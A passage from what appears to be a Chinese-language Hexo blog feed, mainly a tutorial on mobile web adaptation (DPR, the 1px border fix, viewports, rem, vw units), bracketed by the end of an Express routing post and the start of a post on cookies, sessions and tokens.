class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="string">&#x27;/say&#x27;</span>, router);</span><br></pre></td></tr></table></figure><p>这样 <code>router</code> 下的全部路由都会加到 <code>/say</code> 之下，即相当于：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/say/hello&#x27;</span>, helloHandler);</span><br><span class="line">app.post(<span class="string">&#x27;/say/world&#x27;</span>, worldHandler);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Express&quot;&gt;&lt;a href=&quot;#Express&quot; class=&quot;headerlink&quot; title=&quot;Express&quot;&gt;&lt;/a&gt;Express&lt;/h1&gt;&lt;p&gt;直接用Node.js内置的 http 模块去开发服务器有以下明显的弊端：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;</summary>
      
    
    
    
    <category term="Node" scheme="https://lesliewaong.top/categories/Node/"/>
    
    
    <category term="Express" scheme="https://lesliewaong.top/tags/Express/"/>
    
    <category term="Node" scheme="https://lesliewaong.top/tags/Node/"/>
    
  </entry>
  
  <entry>
    <title>移动端适配</title>
    <link href="https://lesliewaong.top/posts/783ce8a9.html"/>
    <id>https://lesliewaong.top/posts/783ce8a9.html</id>
    <published>2022-03-12T07:04:52.000Z</published>
    <updated>2022-03-25T14:08:26.415Z</updated>
    
    <content type="html"><![CDATA[<h1 id="移动端适配"><a href="#移动端适配" class="headerlink" title="移动端适配"></a>移动端适配</h1><h2 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h2><h3 id="屏幕尺寸"><a href="#屏幕尺寸" class="headerlink" title="屏幕尺寸"></a>屏幕尺寸</h3><p>屏幕尺寸是以屏幕对角线的长度来计量，计量单位为英寸。</p><h3 id="像素"><a href="#像素" class="headerlink" title="像素"></a>像素</h3><p>像素（pixel），为组成一幅图像的全部亮度和色度的<strong>最小图像单元</strong>。</p><p>一幅图像通常包含成千上万个像素，每个像素都有自己的颜色信息，它们紧密地组合在一起。</p><p>由于人眼的错觉，这些组合在一起的像素被当成一幅完整的图像。</p><p>当修改图像的某区域，实际上是在修改该区域内的像素。对这些像素修改的好与坏将决定最终图片的质量。</p><p>单位面积内的像素越多，图像的效果就越好。</p><p>彩色电视图像是由成千个像素点所组成的，而且每个像素都是由红绿蓝三种颜色并排组成的。</p><p>(注意每个像素的大小是不固定的，他是根据设备的分辨率决定的)</p><h3 id="分辨率"><a href="#分辨率" class="headerlink" title="分辨率"></a>分辨率</h3><p>屏幕分辨率是指<strong>纵横向上的像素点数</strong>，单位是<code>px</code>。</p><p>屏幕分辨率确定计算机屏幕上显示多少信息的设置，以水平和垂直像素来衡量。</p><p>就相同大小的屏幕而言，当屏幕分辨率低时（例如 640 x 480），在屏幕上显示的像素少，单个像素尺寸比较大。</p><p>屏幕分辨率高时（例如 1600 x 1200），在屏幕上显示的像素多，单个像素尺寸比较小。</p><h4 id="设备物理分辨率（设备像素）"><a href="#设备物理分辨率（设备像素）" class="headerlink" title="设备物理分辨率（设备像素）"></a>设备物理分辨率（设备像素）</h4><p>相信我们所有前端开发者，都是见证了手机这个移动设备发展的过程。从蓝屏手机，到彩屏手机，到诺基亚研发出来触屏手机，再到智能手机一步步发展下来，我们的我们的手越来越清晰，越来越大，所以我们的屏幕发展也越来越迅速。</p><p>从最初的颗粒感相当大的屏幕，到720p再到1080p，甚至于现在各家旗舰手机的2k屏幕，我们的物理分辨率在变得原来越大。这样就暴露出来一个问题，我们如果手机分辨率翻倍，我们的图像不就要被缩小一倍，我们难道要在每个设备上就出个设计稿，每个设备的分辨不尽相同啊，其实你担忧的问题，我们的乔帮主在很多年前就想到了。这就是我们的逻辑分辨率。</p><h4 id="逻辑分辨率（设备独立像素）"><a href="#逻辑分辨率（设备独立像素）" class="headerlink" title="逻辑分辨率（设备独立像素）"></a>逻辑分辨率（设备独立像素）</h4><p>虽然设备物理分辨不同，但是他的这个逻辑分辨率却都差不多，这就要感谢乔帮主了</p><p>乔布斯在iPhone4的发布会上首次提出了Retina Display(视网膜屏幕)的概念，在iPhone4使用的视网膜屏幕中，把2x2个像素当1个像素使用，这样让屏幕看起来更精致，但是元素的大小却不会改变。从此以后高分辨率的设备，多了一个逻辑像素。这些设备逻辑像素的差别虽然不会跨度很大，但是仍然有点差别，于是便诞生了移动端页面需要适配这个问题，既然逻辑像素由物理像素得来，那他们就会有一个像素比值</p><h3 id="设备像素比"><a href="#设备像素比" class="headerlink" title="设备像素比"></a>设备像素比</h3><p><strong>设备像素比device pixel ratio简称dpr</strong>，即<strong>物理像素</strong>和<strong>设备独立像素（逻辑像素）</strong>的比值。</p><p>在 CSS 中经常写的 <code>px</code> 就是指逻辑像素，它和物理像素并不一定是一一对应的，物理像素和逻辑像素之间的对应关系会有 DPR 决定。</p><h4 id="1px边框问题"><a href="#1px边框问题" class="headerlink" title="1px边框问题"></a>1px边框问题</h4><p>关于前端1px像素的问题，网上已经有很多相关的文章了，但是，关于这个问题的原因网上没有几个说到点子上的，甚至还大谈dpr。。。</p><p>试问，如果是dpr的原因，那为什么只有1px才出现视觉效果变粗的问题，而10px、20px的没有？</p><p>其实这个问题的原因和dpr没有任何关系，<strong>dpr可以用来解释不同分辨率手机呈现页面的精细度的差异</strong>，但并不能解释1px问题。</p><p>我们做移动端页面时一般都会设置<code>meta viewport的content=“width=device-width”</code>，这里就是把html视窗宽度大小设置等于设备宽度的大小，大多数手机的屏幕设备宽度都差不多，以iphoneX为例，屏幕宽度375px。</p><p>而UI给设计图的时候基本上都是给的<strong>二倍图甚至三倍图</strong>，假设设计图是750px的二倍图，在750px上设计了1px的边框，要拿到375px宽度的手机来显示，就相当于整体设计图缩小一倍，所以在375px手机上要以0.5px呈现才符合预期效果，然而css里最低只支持1px大小，不足1px就以1px显示，所以你看到的就显得边框较粗，实际上只是<strong>设计图整体缩小了，而1px的边框没有跟着缩小导致的</strong>。（ps：ios较新版已支持0.5px，安卓不支持，这里暂且忽略）。</p><p>简而言之就是：</p><p><strong>多倍的设计图设计了1px的边框，在手机上缩小呈现时，由于css最低只支持显示1px大小，导致边框太粗的效果。</strong></p><h4 id="如何解决"><a href="#如何解决" class="headerlink" title="如何解决"></a>如何解决</h4><p>解决方法有很多，根据项目环境和使用场景选择最合适的就行，下面整理了一下解决方式：</p><h5 id="通过设置meta标签viewport"><a href="#通过设置meta标签viewport" class="headerlink" title="通过设置meta标签viewport"></a>通过设置meta标签viewport</h5><p>分析1px像素产生原因时，有说到meta标签设置的<code>width=device-width</code>，其实这也是产生1px像素问题的前提条件之一，无论你是<code>rem</code>适配方式还是<strong>媒体查询的响应式布局</strong>，你最终在<code>375px</code>的总宽度下，边框最小css单位也只能是1px，而750px的设计图里1px占1/750，375px里1px占1/375，比例大了一倍，视觉上肯定是粗了。</p><p>所以，如果设置<strong>content的width就等于设计图大小750px</strong>，然后通过<strong>动态设置initial-scale值让网页整体缩放</strong>，就能实现效果了，这也是适配移动端不同屏幕大小的一种思路。</p><p>以iphoneX为例，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=750,initial-scale=0.5,user-scalable=no&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样就能让iphoneX完美还原750px的设计图了，<strong>initial-scale的值动态设置为window.screen.width / 750</strong>，iphoneX下就是0.5。</p><p>不过这样设置后，在和其他content属性width值不同的页面间来回切换会出现横向滚动条，不推荐使用（这里介绍这种方法也是帮助更好的理解1px像素问题）。</p><h5 id="通过transform-scale-缩放（推荐）"><a href="#通过transform-scale-缩放（推荐）" class="headerlink" title="通过transform: scale()缩放（推荐）"></a>通过transform: scale()缩放（推荐）</h5><p>单边 以<strong>下边框</strong>为例：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.div</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line"><span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">2px</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#bfbfbf</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scaleY</span>(<span class="number">1</span>/<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">transform-origin</span>: left bottom;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果还需要添加其他边框，可以用before伪元素再加，例如再加个右边框：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.div</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line"><span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">2px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">border-right</span>: <span class="number">1px</span> solid <span class="number">#bfbfbf</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scaleX</span>(<span class="number">1</span>/<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">transform-origin</span>: right bottom;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所有边 此种方式可以添加边框圆角：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="selector-class">.div</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">300%</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1.5px</span> solid <span class="number">#bfbfbf</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1</span>/<span class="number">1.5</span>/<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">transform-origin</span>: left top;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">6px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>备注：</p><p>注意需要先给目标div元素添加<strong>非static的position</strong>属性，因为以上方法都是利用伪元素定位实现的。</p><p>具体的scale缩放比例取决于你是<strong>几倍设计图尺寸下的1px</strong>，例如二倍图(750px)尺寸下，缩放比例就是1/2（敲黑板：scale缩放比例和dpr无关）。</p><p>网上的常规代码会有个别安卓机型边框不显示的问题，我自己的代码已经做了各种兼容处理：单边方案就给伪元素1px的内容区域高度或宽度，加上边框就是2px；所有边的话就基于1.5px边框宽度来进行缩放。</p><h2 id="viewport"><a href="#viewport" class="headerlink" title="viewport"></a>viewport</h2><blockquote><p>视口(viewport)代表当前可见的计算机图形区域。在Web浏览器术语中，通常与浏览器窗口相同，但不包括浏览器的UI， 菜单栏等——即指你正在浏览的文档的那一部分。</p></blockquote><p>而移动端则较为复杂，它涉及到三个视口：布局视口（Layout Viewport）、视觉视口（Visual Viewport）和理想视口（Ideal Viewport）。</p><h3 id="布局视口（layout-viewport）"><a href="#布局视口（layout-viewport）" class="headerlink" title="布局视口（layout viewport）"></a>布局视口（layout viewport）</h3><p>一般移动设备的浏览器都默认设置了一个 viewport 元标签，定义一个虚拟的布局视口（layout viewport），用于解决早期的页面在手机上显示的问题。iOS, Android 基本都将这个视口分辨率设置为 980px，所以 PC 上的网页基本能在手机上呈现，只不过元素看上去很小，一般默认可以通过手动缩放网页。</p><p>布局视口的宽度/高度可以通过 <code>document.documentElement.clientWidth / Height</code> 获取。</p><p>可以看到，默认的布局视口宽度为 980px。如果要显式设置布局视口，可以使用 HTML 中的 meta 标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=400&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>布局视口使视口与移动端浏览器屏幕宽度完全独立开。CSS 布局将会根据它来进行计算，并被它约束。</p><h3 id="视觉视口（visual-viewport）"><a href="#视觉视口（visual-viewport）" class="headerlink" title="视觉视口（visual viewport）"></a>视觉视口（visual viewport）</h3><p>视觉视口是用户当前看到的区域，用户可以通过缩放操作视觉视口，同时不会影响布局视口。</p><p>视觉视口和缩放比例的关系为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当前缩放值 = 理想视口宽度  / 视觉视口宽度</span><br></pre></td></tr></table></figure><p>所以，当用户放大时，视觉视口将会变小，CSS 像素将跨越更多的物理像素。</p><h5 id="理想视口（ideal-viewport）"><a href="#理想视口（ideal-viewport）" class="headerlink" title="理想视口（ideal viewport）"></a>理想视口（ideal viewport）</h5><p>布局视口的默认宽度并不是一个理想的宽度，于是 Apple 和其他浏览器厂商引入了理想视口的概念，它对设备而言是最理想的布局视口尺寸。显示在理想视口中的网站具有最理想的宽度，用户无需进行缩放。</p><p>理想视口的值其实就是屏幕分辨率的值，它对应的像素叫做设备逻辑像素（device independent pixel, dip）。dip 和设备的物理像素无关，一个 dip 在任意像素密度的设备屏幕上都占据相同的空间。如果用户没有进行缩放，那么一个 CSS 像素就等于一个 dip。</p><p>用下面的方法可以使布局视口与理想视口的宽度一致：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>实际上，这就是响应式布局的基础。</p><h3 id="视口的设置"><a href="#视口的设置" class="headerlink" title="视口的设置"></a>视口的设置</h3><p>我们可以使用视口元标签（viewport meta 标签）来进行布局视口的设置。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1.0,maximum-scale=1&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下面是每个属性的详细说明：</p><table><thead><tr><th>属性名</th><th>取值</th><th>描述</th></tr></thead><tbody><tr><td>width</td><td>正整数或device-width</td><td>定义视口的宽度，单位为像素</td></tr><tr><td>height</td><td>正整数或device-height</td><td>定义视口的高度，单位为像素，一般不用</td></tr><tr><td>initial-scale</td><td>[0.0-10.0]</td><td>定义初始缩放值</td></tr><tr><td>minimum-scale</td><td>[0.0-10.0]</td><td>定义放大最大比例，它必须小于或等于maximum-scale设置</td></tr><tr><td>maximum-scale</td><td>[0.0-10.0]</td><td>定义缩小最小比例，它必须大于或等于minimum-scale设置</td></tr><tr><td>user-scalable</td><td>yes / no</td><td>定义是否允许用户手动缩放页面，默认值 yes</td></tr></tbody></table><p>有几点值得注意：</p><ul><li><strong>viewport 标签只对移动端浏览器有效</strong>，对 PC 端浏览器是无效的</li><li>当缩放比例为 100% 时，dip 宽度 = CSS 像素宽度 = 理想视口的宽度 = 布局视口的宽度</li><li>单独设置 initial-scale 或 width 都会有兼容性问题，所以设置布局视口为理想视口的最佳方法是同时设置这两个属性</li><li>即使设置了 user-scalable = no，<strong>在 Android Chrome 浏览器中也可以强制启用手动缩放</strong>。</li></ul><h2 id="解决适配方法"><a href="#解决适配方法" class="headerlink" title="解决适配方法"></a>解决适配方法</h2><h3 id="rem适配"><a href="#rem适配" class="headerlink" title="rem适配"></a>rem适配</h3><p><code>em</code>：在 font-size 中使用是相对于父元素的字体大小，在其他属性中使用是相对于自身的字体大小，如 width。</p><p>rem是CSS3新增的一个相对单位，这个单位引起了广泛关注。这个单位与em有什么区别呢？</p><p>区别在于使用rem为元素设定字体大小时，仍然是相对大小，但<strong>相对的只是HTML根元素</strong>。</p><p>这个单位可谓集相对大小和绝对大小的优点于一身，通过它既可以做到<strong>只修改根元素就成比例地调整所有字体大小</strong>，又可以避免字体大小逐层复合的连锁反应。</p><p>目前，除了IE8及更早版本外，所有浏览器均已支持rem。对于不支持它的浏览器，应对方法也很简单，就是多写一个绝对单位的声明。这些浏览器会忽略用rem设定的字体大小。</p><p>举个例子：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//假设我给根元素的大小设置为<span class="number">14px</span></span><br><span class="line"><span class="selector-tag">html</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>：<span class="number">14px</span></span><br><span class="line">&#125;</span><br><span class="line">//那么我底下的<span class="selector-tag">p</span>标签如果想要也是<span class="number">14</span>像素</span><br><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">1rem</span></span><br><span class="line">&#125;</span><br><span class="line">//如此即可</span><br></pre></td></tr></table></figure><p>rem的布局不得不提flexible，flexible方案是阿里早期开源的一个移动端适配解决方案，引用flexible后，我们在页面上统一使用rem来布局。</p><p>他的原理非常简单</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// set 1rem = viewWidth / 10</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setRemUnit</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> rem = docEl.clientWidth / <span class="number">10</span></span><br><span class="line">    docEl.style.fontSize = rem + <span class="string">&#x27;px&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">setRemUnit();</span><br></pre></td></tr></table></figure><p>rem 是相对于html节点的font-size来做计算的。所以在页面初始话的时候给根元素设置一个font-size，接下来的元素就根据rem来布局，这样就可以保证在页面大小变化时，布局可以自适应，</p><p>如此我们只需要给设计稿的px转换成对应的rem单位即可</p><p>当然，这个方案只是个过渡方案，为什么说是过渡方案</p><p>因为当年viewport在低版本安卓设备上还有兼容问题，而vw，vh还没能实现所有浏览器兼容，所以flexible方案用rem来模拟vmin来实现在不同设备等比缩放的“通用”方案，之所以说是通用方案,是因为他这个方案是根据设备大小去判断页面的展示空间大小即屏幕大小，然后根据屏幕大小去百分百还原设计稿，从而让人看到的效果(展示范围)是一样的，这样一来，苹果5 和苹果6p屏幕如果你按照设计稿还原的话，字体大小实际上不一样，而人们在一样的距离上希望看到的大小其实是一样的，本质上，<strong>用户使用更大的屏幕，是想看到更多的内容，而不是更大的字</strong>。</p><p>so，这个用缩放来解决问题的方案是个过渡方案，注定时代所淘汰</p><h3 id="vw，vh布局"><a href="#vw，vh布局" class="headerlink" title="vw，vh布局"></a>vw，vh布局</h3><blockquote><p>vh、vw方案即将视觉视口宽度 window.innerWidth和视觉视口高度 window.innerHeight 等分为 100 份。</p></blockquote><p>像<code>vw</code>、<code>vh</code>，比较容易混淆的一个单位是<code>%</code>，不过百分比宽泛的讲是相对于父元素：</p><p>对于普通定位元素就是我们理解的父元素</p><ul><li>对于position: absolute;的元素是相对于已定位的父元素</li><li>对于position: fixed;的元素是相对于 ViewPort（可视窗口）</li></ul><p>视口单位主要包括以下4个：</p><ul><li><strong>vw</strong>：1vw等于视口宽度的1%。</li><li><strong>vh</strong>：1vh等于视口高度的1%。</li><li><strong>vmin</strong>：选取vw和vh中最小的那个。</li><li><strong>vmax</strong>：选取vw和vh中最大的那个。</li></ul><p><strong>缺点</strong>：用户失去了放缩任何使用<code>vw</code>单位的元素的能力。</p><p>vh和vw方案和rem类似也是相当麻烦需要做单位转化，而且px转换成vw不一定能完全整除，因此有一定的像素差。</p><p>不过在工程化的今天，webpack解析css 的时候用postcss-loader 有个postcss-px-to-viewport能自动实现px到vw的转化</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">loader</span>: <span class="string">&#x27;postcss-loader&#x27;</span>,</span><br><span class="line">    <span class="attr">options</span>: &#123;</span><br><span class="line">    <span class="attr">plugins</span>: <span class="function">()=&gt;</span>[</span><br><span class="line">        <span class="built_in">require</span>(<span class="string">&#x27;autoprefixer&#x27;</span>)(&#123;</span><br><span class="line">        <span class="attr">browsers</span>: [<span class="string">&#x27;last 5 versions&#x27;</span>]</span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="built_in">require</span>(<span class="string">&#x27;postcss-px-to-viewport&#x27;</span>)(&#123;</span><br><span class="line">        <span class="attr">viewportWidth</span>: <span class="number">375</span>, <span class="comment">//视口宽度（数字)</span></span><br><span class="line">        <span class="attr">viewportHeight</span>: <span class="number">1334</span>, <span class="comment">//视口高度（数字）</span></span><br><span class="line">        <span class="attr">unitPrecision</span>: <span class="number">3</span>, <span class="comment">//设置的保留小数位数（数字）</span></span><br><span class="line">        <span class="attr">viewportUnit</span>: <span class="string">&#x27;vw&#x27;</span>, <span class="comment">//设置要转换的单位（字符串）</span></span><br><span class="line">        <span class="attr">selectorBlackList</span>: [<span class="string">&#x27;.ignore&#x27;</span>, <span class="string">&#x27;.hairlines&#x27;</span>], <span class="comment">//不需要进行转换的类名（数组）</span></span><br><span class="line">                <span class="attr">minPixelValue</span>: <span class="number">1</span>, <span class="comment">//设置要替换的最小像素值（数字）</span></span><br><span class="line">                <span class="attr">mediaQuery</span>: <span class="literal">false</span> <span class="comment">//允许在媒体查询中转换px（true/false）</span></span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="px为主，vx和vxxx（vw-vh-vmax-vmin）为辅，搭配一些flex（推荐）"><a href="#px为主，vx和vxxx（vw-vh-vmax-vmin）为辅，搭配一些flex（推荐）" class="headerlink" title="px为主，vx和vxxx（vw/vh/vmax/vmin）为辅，搭配一些flex（推荐）"></a>px为主，vx和vxxx（vw/vh/vmax/vmin）为辅，搭配一些flex（推荐）</h3><h2 id="移动端适配流程"><a href="#移动端适配流程" class="headerlink" title="移动端适配流程"></a>移动端适配流程</h2><p><strong>1. 在head 设置width=device-width的viewport</strong>‘</p><p><strong>2. 在css中使用px</strong></p><p><strong>3. 在适当的场景使用flex布局，或者配合vw进行自适应</strong></p><p><strong>4. 在跨设备类型的时候（pc &lt;-&gt; 手机 &lt;-&gt; 平板）使用媒体查询</strong></p><p><strong>5. 在跨设备类型如果交互差异太大的情况，考虑分开项目开发</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;移动端适配&quot;&gt;&lt;a href=&quot;#移动端适配&quot; class=&quot;headerlink&quot; title=&quot;移动端适配&quot;&gt;&lt;/a&gt;移动端适配&lt;/h1&gt;&lt;h2 id=&quot;前置基础&quot;&gt;&lt;a href=&quot;#前置基础&quot; class=&quot;headerlink&quot; title=&quot;前置基础&quot;</summary>
      
    
    
    
    <category term="HTML&amp;CSS" scheme="https://lesliewaong.top/categories/HTML-CSS/"/>
    
    
    <category term="Flex" scheme="https://lesliewaong.top/tags/Flex/"/>
    
    <category term="视口" scheme="https://lesliewaong.top/tags/%E8%A7%86%E5%8F%A3/"/>
    
    <category term="rem" scheme="https://lesliewaong.top/tags/rem/"/>
    
    <category term="vw" scheme="https://lesliewaong.top/tags/vw/"/>
    
  </entry>
  
  <entry>
    <title>Cookie、Session、Token、JWT</title>
    <link href="https://lesliewaong.top/posts/50cb7bb5.html"/>
    <id>https://lesliewaong.top/posts/50cb7bb5.html</id>
    <published>2022-03-11T03:11:11.000Z</published>
    <updated>2022-03-25T14:08:26.385Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cookie、Session、Token、JWT"><a href="#Cookie、Session、Token、JWT" class="headerlink" title="Cookie、Session、Token、JWT"></a>Cookie、Session、Token、JWT</h1><h2 id="Session-amp-Cookie"><a href="#Session-amp-Cookie" class="headerlink" title="Session &amp; Cookie"></a>Session &amp; Cookie</h2><p>HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是<strong>服务器发送到用户浏览器</strong>并<strong>保存在本地的一小块数据</strong>，它会在<strong>浏览器下次向同一服务器再发起请求时被携带并发送到服务器上</strong>。</p><p>通常，它用于告知服务端两个请求是否来自同一浏览器，如<strong>保持用户的登录状态</strong>。Cookie 使基于<strong>无状态</strong>的HTTP协议记录稳定的状态信息成为了可能。</p><p>Cookie 主要用于以下三个方面：</p><ul><li><strong>会话状态管理</strong>（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li><li><strong>个性化设置</strong>（如用户自定义设置、主题等）</li><li><strong>浏览器行为跟踪</strong>（如跟踪分析用户行为等）</li></ul><p><strong>session 是另一种记录服务器和客户端会话状态的机制</strong>。</p><p><strong>session</strong> 是基于<code>cookie</code> 实现的<strong>，session 存储在服务器端</strong>，<code>sessionId</code> 会被<strong>存储到客户端的cookie 中</strong>。</p><p>第一次创建Session的时候，服务端会在HTTP协议中告诉客户端，需要在 Cookie 里面记录一个<code>Session ID</code>，以后每次请求把这个会话ID发送到服务器，我就知道你是谁了。</p><p><a href="https://imgtu.com/i/qJKhxx"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s1.ax1x.com/2022/03/24/qJKhxx.png" alt="qJKhxx.png"></a></p><h2 id="Session-和-Cookie区别"><a href="#Session-和-Cookie区别" class="headerlink" title="Session 和 Cookie区别"></a>Session 和 Cookie区别</h2><ul><li><strong>安全性：</strong> Session 比 Cookie 安全，Session 是存储在服务器端的，Cookie 是存储在客户端的。</li><li><strong>存取值的类型不同</strong>：Cookie 只支持存字符串数据，想要设置其他类型的数据，需要将其转换成字符串，Session 可以存任意数据类型。</li><li><strong>有效期不同：</strong> Cookie 可设置为长时间保持，比如我们经常使用的默认登录功能，Session一般持续时间较短，客户端关闭（默认情况下）或者 Session 超时都会失效。</li><li><strong>存储大小不同：</strong> 单个 Cookie 保存的数据不能超过 4K，Session 可存储数据远高于 Cookie，但是当访问量过多，会占用过多的服务器资源。</li></ul><h2 id="Token（令牌）"><a href="#Token（令牌）" class="headerlink" title="Token（令牌）"></a>Token（令牌）</h2><h3 id="Acesss-Token"><a href="#Acesss-Token" class="headerlink" title="Acesss Token"></a>Acesss Token</h3><ul><li><strong>访问资源接口（API）时所需要的资源凭证</strong></li><li><strong>简单 token 的组成：</strong> uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign（签名，token 的前几位以哈希算法压缩成的一定长度的十六进制字符串）</li><li>特点：<ul><li><strong>服务端无状态化、可扩展性好</strong></li><li><strong>支持移动端设备</strong></li><li>安全</li><li>支持跨程序调用</li></ul></li><li><strong>token 的身份验证流程：</strong></li></ul><p><a href="https://imgtu.com/i/qJKIsK"><img src= 